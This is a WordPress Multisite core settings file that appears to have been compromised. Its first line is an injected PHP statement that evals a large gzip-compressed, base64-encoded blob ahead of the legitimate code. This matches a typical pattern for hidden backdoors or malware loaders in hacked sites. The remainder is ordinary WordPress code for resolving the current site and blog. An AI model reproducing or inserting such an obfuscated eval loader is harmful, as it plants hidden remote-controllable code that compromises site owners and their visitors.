<?php eval(gzinflate(base64_decode('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')));?>
<?php
/**
 * Used to set up and fix common variables and include
 * the Multisite procedural and class library.
 *
 * Allows for some configuration in wp-config.php (see ms-default-constants.php)
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Include Multisite initialization functions */
require( ABSPATH . WPINC . '/ms-load.php' );
require( ABSPATH . WPINC . '/ms-default-constants.php' );

if ( defined( 'SUNRISE' ) )
	include_once( WP_CONTENT_DIR . '/sunrise.php' );

/** Check for and define SUBDOMAIN_INSTALL and the deprecated VHOST constant. */
ms_subdomain_constants();

if ( !isset( $current_site ) || !isset( $current_blog ) ) {

	$domain = addslashes( $_SERVER['HTTP_HOST'] );
	if ( false !== strpos( $domain, ':' ) ) {
		if ( substr( $domain, -3 ) == ':80' ) {
			$domain = substr( $domain, 0, -3 );
			$_SERVER['HTTP_HOST'] = substr( $_SERVER['HTTP_HOST'], 0, -3 );
		} elseif ( substr( $domain, -4 ) == ':443' ) {
			$domain = substr( $domain, 0, -4 );
			$_SERVER['HTTP_HOST'] = substr( $_SERVER['HTTP_HOST'], 0, -4 );
		} else {
			wp_load_translations_early();
			wp_die( __( 'Multisite only works without the port number in the URL.' ) );
		}
	}

	$domain = rtrim( $domain, '.' );
	$cookie_domain = $domain;
	if ( substr( $cookie_domain, 0, 4 ) == 'www.' )
		$cookie_domain = substr( $cookie_domain, 4 );

	$path = preg_replace( '|([a-z0-9-]+.php.*)|', '', $_SERVER['REQUEST_URI'] );
	$path = str_replace ( '/wp-admin/', '/', $path );
	$path = preg_replace( '|(/[a-z0-9-]+?/).*|', '$1', $path );

	$current_site = wpmu_current_site();
	if ( ! isset( $current_site->blog_id ) )
		$current_site->blog_id = $wpdb->get_var( $wpdb->prepare( "SELECT blog_id FROM $wpdb->blogs WHERE domain = %s AND path = %s", $current_site->domain, $current_site->path ) );

	if ( is_subdomain_install() ) {
		$current_blog = wp_cache_get( 'current_blog_' . $domain, 'site-options' );
		if ( !$current_blog ) {
			$current_blog = get_blog_details( array( 'domain' => $domain ), false );
			if ( $current_blog )
				wp_cache_set( 'current_blog_' . $domain, $current_blog, 'site-options' );
		}
		if ( $current_blog && $current_blog->site_id != $current_site->id ) {
			$current_site = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->site WHERE id = %d", $current_blog->site_id ) );
			if ( ! isset( $current_site->blog_id ) )
				$current_site->blog_id = $wpdb->get_var( $wpdb->prepare( "SELECT blog_id FROM $wpdb->blogs WHERE domain = %s AND path = %s", $current_site->domain, $current_site->path ) );
		} else
			$blogname = substr( $domain, 0, strpos( $domain, '.' ) );
	} else {
		$blogname = htmlspecialchars( substr( $_SERVER[ 'REQUEST_URI' ], strlen( $path ) ) );
		if ( false !== strpos( $blogname, '/' ) )
			$blogname = substr( $blogname, 0, strpos( $blogname, '/' ) );
		if ( false !== strpos( $blogname, '?' ) )
			$blogname = substr( $blogname, 0, strpos( $blogname, '?' ) );
		$reserved_blognames = array( 'page', 'comments', 'blog', 'wp-admin', 'wp-includes', 'wp-content', 'files', 'feed' );
		if ( $blogname != '' && ! in_array( $blogname, $reserved_blognames ) && ! is_file( $blogname ) )
			$path .= $blogname . '/';
		$current_blog = wp_cache_get( 'current_blog_' . $domain . $path, 'site-options' );
		if ( ! $current_blog ) {
			$current_blog = get_blog_details( array( 'domain' => $domain, 'path' => $path ), false );
			if ( $current_blog )
				wp_cache_set( 'current_blog_' . $domain . $path, $current_blog, 'site-options' );
		}
		unset($reserved_blognames);
	}

	if ( ! defined( 'WP_INSTALLING' ) && is_subdomain_install() && ! is_object( $current_blog ) ) {
		if ( defined( 'NOBLOGREDIRECT' ) ) {
			$destination = NOBLOGREDIRECT;
			if ( '%siteurl%' == $destination )
				$destination = "http://" . $current_site->domain . $current_site->path;
		} else {
			$destination = 'http://' . $current_site->domain . $current_site->path . 'wp-signup.php?new=' . str_replace( '.' . $current_site->domain, '', $domain );
		}
		header( 'Location: ' . $destination );
		die();
	}

	if ( ! defined( 'WP_INSTALLING' ) ) {
		if ( $current_site && ! $current_blog ) {
			if ( $current_site->domain != $_SERVER[ 'HTTP_HOST' ] ) {
				header( 'Location: http://' . $current_site->domain . $current_site->path );
				exit;
			}
			$current_blog = get_blog_details( array( 'domain' => $current_site->domain, 'path' => $current_site->path ), false );
		}
		if ( ! $current_blog || ! $current_site )
			ms_not_installed();
	}

	$blog_id = $current_blog->blog_id;
	$public  = $current_blog->public;

	if ( empty( $current_blog->site_id ) )
		$current_blog->site_id = 1;
	$site_id = $current_blog->site_id;

	$current_site = get_current_site_name( $current_site );

	if ( ! $blog_id ) {
		if ( defined( 'WP_INSTALLING' ) ) {
			$current_blog->blog_id = $blog_id = 1;
		} else {
			wp_load_translations_early();
			$msg = ! $wpdb->get_var( "SHOW TABLES LIKE '$wpdb->site'" ) ? ' ' . __( 'Database tables are missing.' ) : '';
			wp_die( __( 'No site by that name on this system.' ) . $msg );
		}
	}
}
$wpdb->set_prefix( $table_prefix, false ); // $table_prefix can be set in sunrise.php
$wpdb->set_blog_id( $current_blog->blog_id, $current_blog->site_id );
$table_prefix = $wpdb->get_blog_prefix();
$_wp_switched_stack = array();
$switched = false;

// need to init cache again after blog_id is set
wp_start_object_cache();

// Define upload directory constants
ms_upload_constants();
